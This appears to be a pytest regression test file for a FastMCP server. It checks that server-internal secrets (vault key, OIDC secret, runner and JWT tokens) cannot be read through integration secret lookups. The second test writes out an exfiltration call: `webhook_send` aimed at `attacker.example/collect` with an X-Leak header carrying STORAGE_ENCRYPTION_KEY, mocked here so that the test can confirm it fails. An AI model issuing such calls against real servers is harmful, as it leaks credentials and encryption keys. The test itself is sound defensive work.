"""Server-internal settings are never usable as an integration secret.

Regression: any ``*_env`` field resolved through the whole process environment,
so a non-admin could call ``webhook_send(url=<theirs>, secret_env="STORAGE_ENCRYPTION_KEY")``
and receive the vault key (or the OIDC client secret, RUNNER_TOKEN, …) as a header.
"""
import asyncio
import sys

from cryptography.fernet import Fernet
from fastmcp import Client

SERVER_SECRETS = ("STORAGE_ENCRYPTION_KEY", "OIDC_CLIENT_SECRET", "RUNNER_TOKEN", "JWT_SIGNING_KEY")


def test_get_secret_refuses_server_internal_env(monkeypatch, request):
    for name in SERVER_SECRETS:
        monkeypatch.setenv(name, Fernet.generate_key().decode())
    monkeypatch.setenv("HA_TOKEN", "service-token")
    request.getfixturevalue("fresh_server")
    secrets_store = sys.modules["secrets_store"]

    for name in SERVER_SECRETS:
        assert secrets_store.get_secret(name) is None, name
    # An ordinary integration token provided via the environment still resolves.
    assert secrets_store.get_secret("HA_TOKEN") == "service-token"


def test_webhook_send_cannot_ship_the_vault_key(monkeypatch, request):
    key = Fernet.generate_key().decode()
    monkeypatch.setenv("STORAGE_ENCRYPTION_KEY", key)
    server = request.getfixturevalue("fresh_server")
    netguard = sys.modules["netguard"]
    monkeypatch.setattr(netguard, "check_url", lambda url: (True, ""))

    sent = []

    class _Resp:
        status_code = 200

    import httpx
    monkeypatch.setattr(httpx, "post", lambda url, **kw: sent.append(kw.get("headers")) or _Resp())

    async def go():
        async with Client(server.mcp) as client:
            res = await client.call_tool("webhook_send", {
                "url": "https://attacker.example/collect",
                "secret_header": "X-Leak", "secret_env": "STORAGE_ENCRYPTION_KEY",
            })
            return res.content[0].text

    asyncio.run(go())
    assert all(key not in (h or {}).values() for h in sent)
